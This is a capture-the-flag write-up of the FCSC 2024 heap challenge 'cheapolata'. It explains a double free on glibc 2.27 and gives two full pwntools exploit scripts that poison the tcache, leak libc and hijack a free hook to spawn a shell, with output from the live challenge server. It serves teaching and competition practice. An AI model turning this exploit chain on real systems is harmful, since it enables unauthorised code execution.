# FCSC 2024 : cheapolata

# Challenge

Cheapolata was a heap pwn challenge from FCSC 2024, here's a summary:
- 2 stars
- 29 solves
- 429 points
- Author: Cryptanalyse
> On vous demande de lire le fichier flag.txt sur le serveur distant.


We are given 4 files:
- `libc-2.27` and `ld-2.27`
- the source code: `cheapolata.c`
- the binary: `cheapolata`

---
# Setup

I will use [gef](https://github.com/bata24/gef) (bata24's fork) for this challenge, pwninit to unstrip the libc for easier debugging and [pwntools](https://github.com/Gallopsled/pwntools) to write my python exploit.
```sh
pwninit --bin cheapolata --ld ld-2.27.so --libc libc-2.27.so
```

---
# Analysis


```sh
$ checksec --file ./cheapolata_patched
[...]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```
Alright, we can't overwrite `GOT` entries and no leaks are needed to overwrite stuff in the binary (no `PIE`).

```C
int main() {
    int ret;
    size_t size;
    unsigned int cnt_free;

    cnt_free = 0;
    while (1) {
        menu();
        switch (read_long()) {
        case 1:
            printf("Size: ");
            size = read_long();
            if (size > 0x40) {
                fprintf(stderr, "Error: size too large.\n");
                exit(EXIT_FAILURE);
            }

            a = malloc(size);
            if (!a) {
                errExit("malloc error");
            }
            
            printf("Content: ");
            read_string(a, size);
            break;
        case 2:
            if (cnt_free < MAX_FREE) { // MAX_FREE = 6
                free(a);
                cnt_free++;
            }
            break;
        case 3:
            return EXIT_SUCCESS;
        }
    }
    return EXIT_SUCCESS;
}
```
**TLDR**
- First choice will malloc a chunk, where we control size (which needs to be below 0x40) and chunk content. Note that we can only keep track of 1 chunk.
- Second choice will free it and increment "cnt_free", we can only free 6 times.
- Third choice will exit.

```C
void read_string(unsigned char *buf, unsigned int size)
{
    int nbRead;
    nbRead = read(STDIN_FILENO, buf, size);
    if (nbRead < 0) {
        errExit("read error");
    }
    if (buf[nbRead - 1] == '\n') {
        buf[nbRead - 1] = 0;
    }
}
```
`read_string()` uses `read()`: we can write null bytes in our chunk.

The program also modifies `__free_hook` to do additional checks when we free something:
```C
static void (*old_free_hook)(void *ptr, const void *caller);

static __attribute__((constructor)) void
init_hook(void) {
    old_free_hook = __free_hook;
    __free_hook = free_hook;
}

static void
free_hook(void *ptr, const void *caller) {
    void *result;
    size_t size = chunksize(mem2chunk(ptr));

    __free_hook = old_free_hook;
    if (size < MAX_FREE_SIZE) { // MAX_FREE_SIZE = 0x40
        free(ptr);
    } else {
        errExit("free error: too large");
    }

    old_free_hook = __free_hook;
    __free_hook = free_hook;

    return result;
}
```
It abort if we try to free a chunk bigger than 0x40 before calling the real `free()` therefore we'll have to work with `tcache`.
The old value of `__free_hook` is stored in `old_free_hook`, we can modify it to get code execution.
The program doesn't set the current chunk `"a"` to null after free-ing it, there's a double free vulnerability.

---
# The exploit

##### Getting a write primitive

The libc is quite old (2.27), it doesn't have tcache [double free protection](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4166) nor safe linking so we can just double free a chunk, malloc one chunk to overwrite the fd pointer and get arbitrary write at the cost of 2 free().
Sounds expensive...
Maybe double free a chunk, partial overwrite the fd pointer to make it point to the `tcache_perthread_struct` and get 3 arbitrary writes from 2 free() ? This will also cost us a 4 bit bruteforce because we don't have any heap leak.

##### Achieving code execution

The arbitrary write allows us to overwrite `old_free_hook` in order to call any function when `free_hook()` calls `free()` (after setting `__free_hook` to `old_free_hook`) with the current chunk `"a"` as first argument.
We can look at the `GOT` in gdb for functions to leak stuff:

|Name              | PLT      | GOT      | GOT value                           |
|------------------|----------|----------|-------------------------------------|
|free              | 0x400690 | 0x601fa0 | 0x7ffff7897950 <__GI___libc_free>   |
|puts              | 0x4006a0 | 0x601fa8 | 0x7ffff78809c0 <_IO_puts>           |
|__stack_chk_fail  | 0x4006b0 | 0x601fb0 | 0x7ffff7934c80 <__stack_chk_fail>   |
|printf            | 0x4006c0 | 0x601fb8 | 0x7ffff7864e80 <__printf>           |
|read              | 0x4006d0 | 0x601fc0 | 0x7ffff7910070 <__GI___libc_read>   |
|atoll             | 0x4006e0 | 0x601fc8 | 0x7ffff78406b0 <atoll>              |
|malloc            | 0x4006f0 | 0x601fd0 | 0x7ffff7897070 <__GI___libc_malloc> |
|perror            | 0x400700 | 0x601fd8 | 0x7ffff787b270 <__GI_perror>        |
|exit              | 0x400710 | 0x601fe0 | 0x7ffff7843120 <__GI_exit>          |
|fwrite            | 0x400720 | 0x601fe8 | 0x7ffff787f8a0 <__GI__IO_fwrite>    |

We're able to overwrite `old_free_hook` with `puts@plt`, this gives us an arbitrary read. However, once `old_free_hook` is replaced, we will no longer be able to free anymore.
Given the arbitrary read, we can hijack a fd pointer with any address and leak with `free()`, the fake chunk also needs to have a correct size to pass the size check (below 0x40). We can either leak the `GOT` of `free()` or `stderr` (the stderr of the binary) to get a libc address, we'll use `stderr` for this exploit.

##### The plan

Overwrite tcache entries 0x20, 0x30 and 0x40 with the address of `stderr` (I'm talking about the stderr of the binary), `old_free_hook` and `old_free_hook`, we'll see why later.

First malloc a 0x28 sized chunk (malloc will convert it to 0x30) to overwrite `old_free_hook` with `puts@plt` to get arbitrary read.
Then malloc a 1 sized chunk (converted to 0x20), it will overwrite the LSB of `stderr` but the leak will still be usable because the 24 bit lower bits are not affected by ASLR. Leak `stderr` with `free()` (replaced by `puts@plt`).

Finally, malloc a 0x38 sized chunk (converted to 0x40) to overwrite `old_free_hook` to `system()`, malloc a "/bin/sh\0" chunk and free it to get a shell!

**TLDR**
- double free to hijack `tcache_perthread_struct` and overwrite tcache entries 0x20, 0x30 and 0x40 with `&stderr`, `old_free_hook` and `old_free_hook`
- overwrite `old_free_hook` with puts and leak stderr
- overwrite `old_free_hook` with `system()` and get a shell.

Here's the script:
```py
from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./cheapolata_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define current
    x/10xg (void*)a-0x10
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2106)

def launch_local():
    global file, io
    # io = remote(host="localhost", port=1234)
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)] # returns stuff between a & b

def alloc(size, data):
    sla(b"exit\n", b"1")
    sleep(speed)
    sl(str(size).encode())
    sleep(speed)
    if size == 0:
        return
    sl(data)
    sleep(speed)

def free():
    sla(b"exit\n", b"2")
    sleep(speed)

def quit():
    sla(b"exit\n", b"3")

exe = ELF(file)
libc = ELF("./libc.so.6")

# exploit goes here

def exploit():
    guess = rnd.randint(0, 0xf)
    print("guess: %#x" % guess)
    sleep(speed)

    alloc(2, b"") # double free 0x20 sized chunk (to later hijack tcache_perthread_struct)
    free()
    free()

    hijack_address = (guess << 12) + 0x50
    alloc(2, p16(hijack_address)) # partial overwrite fd with 4 bit bruteforce
    alloc(2, b"") # unused malloc to set tcache entry = fake fd



    payload = flat([ # prepare tcache_perthread_struct overwrite payload
        exe.sym["stderr"], # 0x20, will use to leak libc
        exe.sym["old_free_hook"], # 0x30, will use to overwrite old_free_hook with puts
        exe.sym["old_free_hook"], # 0x40, will use to overwrite old_free_hook with system
    ])
    alloc(0x18, payload) # overwrite tcache_perthread_struct
    
    alloc(0x28, p64(exe.plt["puts"])[:7]) # overwrite free_hook with puts plt
    alloc(1, b"A")
    free() # leak stderr

    leak = recv()
    leak += io.recv(timeout=speed)

    leak = b"A" + getb(leak, b"exit\n>>> A", b"\n=====")
    libc.address = (u64(leak) & ~0xfff) - 0x3ec000
    print("libc: %#018x" % libc.address)

    if libc.address == 0x6e65746e6f046000: # quick fix
        raise EOFError()
    if input("good libc?") == "n": # just in case
        raise EOFError()

    sleep(speed) # manual malloc because recv() emptied the buffer so sendlineafter won't work
    sl(b"1")
    sleep(speed)
    sl(str(0x38).encode())
    sleep(speed)
    sl(p64(libc.sym["system"])) # overwrite old_free_hook with system

    alloc(0x18, b"/bin/sh\0")
    free() # call system("/bin/sh")

    io.interactive() # enjoy your shell
    input("end")
    exit()

while True:
    sleep(speed)
    launch()
    try:
        exploit()
    except EOFError:
        print("fail :(")
    io.close()
```

It works locally:
```sh
$ python exploit_bf.py

[...]

[+] Starting local process './cheapolata_patched': pid 33719
guess: 0xe
libc: 0x6e65746e6f046000
fail :(
[*] Stopped process './cheapolata_patched' (pid 33719)

[...]

[+] Starting local process './cheapolata_patched': pid 33721
guess: 0x8
libc: 0x000079a7edc00000
good libc?
[*] Switching to interactive mode
$ $ whoami
meisr
$ $
```

However it does not work remotly which is sad because I could have first blooded it...

---
# The new plan

The max free limit scared me and I decided to hijack the `tcache_perthread_struct` but we actually don't need to.

![meme failed to load :(](https://imgur.com/qb4Lsqq)

We can double free a 0x20 sized chunk to later overwrite `old_free_hook`, then double free a 0x30 sized chunk to overwrite `old_free_hook` and `"a"` (`"a"` holds the current chunk and it is just after `old_free_hook`).
Now we can overwrite both `old_free_hook` with `puts@plt` and `"a"` with the address of `stderr` at the same time. 
We are now able to leak `stderr` with free, use the 0x20 sized chunk we double free-ed before to overwrite `old_free_hook` with `system()`, malloc a "/bin/sh\0" and use our last free on it to get a shell!

```C
0x602030:                       0x0000000000000000      0x0000000000000000 <--- null qword behind stderr (below 0x40)
0x602040 <stderr@@GLIBC_2.2.5>: 0x000073c2a7dec680      0x0000000000000000
0x602050 <old_free_hook>:       0x00000000004006a0      0x0000000000602040 <--- "a"
```

**TLDR**
- double free to overwrite `old_free_hook` and `"a"` with `puts@plt` and `&stderr` to leak libc.
- overwrite `old_free_hook` with `system()` and get a shell.

Here's the new script:
```py
from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./cheapolata_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define current
    x/10xg (void*)a-0x10
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2106)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)] # returns stuff between a & b

def alloc(size, data):
    # sl(b"1")
    sla(b"exit\n", b"1")
    sleep(speed)
    sl(str(size).encode())
    sleep(speed)
    sl(data)
    sleep(speed)

def free():
    sla(b"exit\n", b"2")
    sleep(speed)

def quit():
    sla(b"exit\n", b"3")

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    sleep(speed)

    alloc(8, b"") # double free 0x20 sized chunk to later overwrite old_free_hook
    free()
    free()

    alloc(0x28, b"")# double free 0x20 sized chunk to overwrite old_free_hook
    free()
    free()
    alloc(0x28, p64(exe.sym["old_free_hook"]))
    alloc(0x28, b"")
    payload = flat([
        exe.plt["puts"], # old_free_hook -> puts@plt
        exe.sym["stderr"], # "a" -> address of stderr
    ])
    alloc(0x28, payload)
    debug()
    input()
    free() # free(a) to leak stderr

    leak = recvu(b"free")
    leak = getb(leak, b">>> ", b"\n=====")
    libc.address = u64(leak) - 0x3ec680
    print("libc: %#018x" % libc.address)

    alloc(8, p64(exe.sym["old_free_hook"])) # overwrite old_free_hook with system()
    alloc(8, b"")
    alloc(8, p64(libc.sym["system"]))
    alloc(0x28, b"/bin/sh\0")
    free() # call system("/bin/sh")

    io.interactive()
    input("end")
    exit()

launch()
exploit()
```

It doesn't need bruteforce anymore and it works remotely !!
```sh
$ python exploit.py

[...]

[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2106: Done
libc: 0x00006ee979764000
[*] Switching to interactive mode
>>> ===== Cheapolata =====
 1. malloc
 2. free
 3. exit
>>> Size: Content: ===== Cheapolata =====
 1. malloc
 2. free
 3. exit
>>> $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
FCSC{d0c6b5b751e3bf4b6588fd7261a6ca0bd0a2fd694b25bc1492d2a67b6a38cec8}
```

---
# Conclusion
Thanks for reading this writeup, this is my first one and I hope you liked it.
This challenge taught me a valuable lesson, huge thanks to the author for this challenge.